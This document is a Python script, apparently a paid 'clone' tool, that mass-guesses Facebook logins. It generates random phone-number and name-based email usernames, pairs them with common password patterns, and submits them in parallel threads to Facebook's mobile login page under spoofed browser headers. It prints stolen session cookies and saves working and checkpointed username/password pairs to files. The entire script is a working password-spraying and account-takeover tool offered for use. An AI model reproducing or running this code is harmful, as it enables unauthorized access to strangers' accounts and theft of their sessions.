import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ugen = []
ugen = []
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/533.1'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
cokbrut=[]
ses=requests.Session()

	
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def main():
    os.system('clear')
    print(logo)
    print("  \033[1;32m〘\033[1;97m1\033[1;32m〙 \033[1;97mPHONE NUMBER CLONE          ")
    print("  \033[1;32m〘\033[1;97m2\033[1;32m〙\033[1;97m GMAIL UID CLONE               ")
    print("  \033[1;32m〘\033[1;97m0\033[1;32m〙 \033[1;97mEXIT TOOL                     ")
    linex()
    ZWE = input(f'\033[1;32m  〘\033[1;97m?\033[1;32m〙 \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["2","02"]:
        gmail()
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97m EXAMPLE : \033[1;32m〘\033[1;97m789\033[1;32m〙〘\033[1;97m440\033[1;32m〙〘\033[1;97m670\033[1;32m〙")
    linex()
    code = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97m INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙 \033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m3000\033[1;32m〙〘\033[1;97m5000\033[1;32m〙〘\033[1;97m10000\033[1;32m〙")
    linex()
    limit=int(input("\033[1;32m  〘\033[1;32m?\033[1;32m〙\033[1;97m INPUT YOUR LIMIT :\033[1;32m "))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=70) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID       \033[1;32m║ \033[1;32m'+tl+'                   ')
        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCHOICE CODE    \033[1;32m║ \033[1;32m'+code+'             ')
        print(f" \033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m═\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
        linex()
        for love in user:
            uid = '09'+code+love
            pwx = [love,code+love,code+love[:3]]
            LEE.submit(rcrack,uid,pwx,tl)

def gmail():
    os.system('clear')
    print(logo)
    print("  \033[1;32m〘\033[1;97m1\033[1;32m〙\033[1;97m DIGIT CLONE (Two)               ")
    print("  \033[1;32m〘\033[1;97m2\033[1;32m〙\033[1;97m DIGIT CLONE  (Three)              ")
    print("  \033[1;32m〘\033[1;97m3\033[1;32m〙\033[1;97m DIGIT CLONE (Four)                ") 
    print("  \033[1;32m〘\033[1;97m0\033[1;32m〙\033[1;32m MAIN MENU                 ")    
    linex()
    ZWE = input(f'\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mSELECT :\033[1;32m ')
    if ZWE in ["1","01"]:
        gmail_two()
    if ZWE in ["2","02"]:
        gmail_three()
    if ZWE in ["3","03"]:
        gmail_four()
    if ZWE in ["0","00"]:
        main()        

def gmail_two():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mtun\033[1;32m〙〘\033[1;97mzaw\033[1;32m〙〘\033[1;97maung\033[1;32m〙 ")
                linex()
                first = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙 \033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mlin\033[1;32m〙〘\033[1;97mhtet\033[1;32m〙〘\033[1;97mmin\033[1;32m〙 ")
                linex()
                last = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m@gmail.com\033[1;32m║ ║\033[1;97m@yahoo.com\033[1;32m║ ")
                linex()
                domain = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m3000\033[1;32m║ ║\033[1;97m5000\033[1;32m║ ║\033[1;97m10000\033[1;32m║ ")
                linex()
                try:
                        limit=int(input("\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,3))
                        user.append(nmp)                               
                with ThreadPool(max_workers=50) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID       \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME     \033[1;32m║ \033[1;32m'+first+'.'+last+'.xx'+domain+'')
                        print(f"  \033[1;32m〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m═\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+last+'.'+digitx+domain
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)        
       
def gmail_three():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97mtun\033[1;32m║ ║\033[1;97mzaw\033[1;32m║ ║\033[1;97maung\033[1;32m║ ")
                linex()
                first = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97mlin\033[1;32m║ ║\033[1;97mhtet\033[1;32m║ ║\033[1;97mmin\033[1;32m║ ")
                linex()
                last = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m@gmail.com\033[1;32m║ ║\033[1;97m@yahoo.com\033[1;32m║ ")
                linex()
                domain = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m3000\033[1;32m║ ║\033[1;97m5000\033[1;32m║ ║\033[1;97m10000\033[1;32m║ ")
                linex()
                try:
                        limit=int(input("\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,4))
                        user.append(nmp)                               
                with ThreadPool(max_workers=50) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID       \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME     \033[1;32m║ \033[1;32m'+first+'.'+last+'.xxx'+domain+'')
                        print(f"  \033[1;32m〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m═\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+last+'.'+digitx+domain
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)
def gmail_four():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97mtun\033[1;32m║ ║\033[1;97mzaw\033[1;32m║ ║\033[1;97maung\033[1;32m║ ")
                linex()
                first = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97mlin\033[1;32m║ ║\033[1;97mhtet\033[1;32m║ ║\033[1;97mmin\033[1;32m║ ")
                linex()
                last = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m@gmail.com\033[1;32m║ ║\033[1;97m@yahoo.com\033[1;32m║ ")
                linex()
                domain = input('\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m║\033[1;97m3000\033[1;32m║ ║\033[1;97m5000\033[1;32m║ ║\033[1;97m10000\033[1;32m║ ")
                linex()
                try:
                        limit=int(input("\033[1;32m  〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=50) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID       \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME     \033[1;32m║ \033[1;32m'+first+'.'+last+'.xxxx'+domain+'')
                        print(f"  \033[1;32m〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m═\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+last+'.'+digitx+domain
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)                
    
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            user_agent="Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;] FBBK/1" 
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r \033[1;32m〘%sZWE-LAY\033[1;32m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'%(bi,loop,tl,len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = headers = {
    'authority': 'p.facebook.com',
    'method': 'GET',
    'path':'/home.php?tbua=1',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'my-MM,my;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=GGmEZc6PkzITyImlz8osGqG7; sb=GGmEZU2FATMiVj7C-8KParTA; m_pixel_ratio=2; wd=360x693; fr=0Ij0XnKUUx6wFXur8..BlhGkY.Q7.AAA.0.0.BlhGk1.AWXVRzKUrfw',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Pixel 6 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;32m  〘OK〙  {uid} ▣ {ps}" '  \n\033[1;97m〘COOKIE〙 = \033[1;97m'+coki+  '')
                linex()
                open('/sdcard/ZWE-NOOBS-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[1;90m  〘CP〙  {uid} ▣ {ps}")
                open('/sdcard/ZWE-NOOBS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
        

logo= ("""
  \033[1;32m          ╔\033[1;97m═════════\033[1;32m═\033[1;97m══════════\033[1;32m╗
  \033[1;97m          ║ \033[1;32mWELCOME TO MY TOOL \033[1;97m║
  \033[1;32m          ╚\033[1;97m═════════\033[1;32m═\033[1;97m══════════\033[1;32m╝
  \033[1;97m ╔\033[1;32m══════════════════\033[1;97m═\033[1;32m══════════════════\033[1;97m╗  
  \033[1;32m ║\033[1;97m  ███████     ██     ██     ███████  \033[1;32m║
  \033[1;32m ║   \033[1;97m  ███      ██  \033[1;32m✭\033[1;97m  ██     ██       \033[1;32m║
  \033[1;32m ║  \033[1;97m  ███       ██  \033[1;97m█  \033[1;97m██     ██████   \033[1;32m║
  \033[1;32m ║ \033[1;97m  ███        ██ ███ ██     ██       \033[1;32m║
  \033[1;32m ║\033[1;97m  ███████      ███ ███      ███████  \033[1;32m║
  \033[1;97m ╚\033[1;32m══════════════════\033[1;97m═\033[1;32m══════════════════\033[1;97m╝
  \033[1;32m〘\033[1;97m✔\033[1;32m〙 \033[1;97mEDITOR       \033[1;32m ║ \033[1;32mZWE-LAY          
  \033[1;32m〘\033[1;97m✔\033[1;32m〙 \033[1;97mTELEGRAM    \033[1;32m  ║ \033[1;32mWAI-LIN-OO    
  \033[1;32m〘\033[1;97m✔\033[1;32m〙 \033[1;97mSTATUS       \033[1;32m ║ \033[1;32mMIX CLONE        
  \033[1;32m〘\033[1;97m✔\033[1;32m〙 \033[1;97mTOOL VERSION \033[1;32m ║ \033[1;32m18+\033[1;32m〘PAID〙  
  \033[1;97m ═\033[1;32m══════════════════\033[1;97m═\033[1;32m══════════════════\033[1;97m═ """) 
def linex():
	print(f' \033[1;97m  ═\033[1;32m══════════════════\033[1;97m═\033[1;32m══════════════════\033[1;97m═')

main()
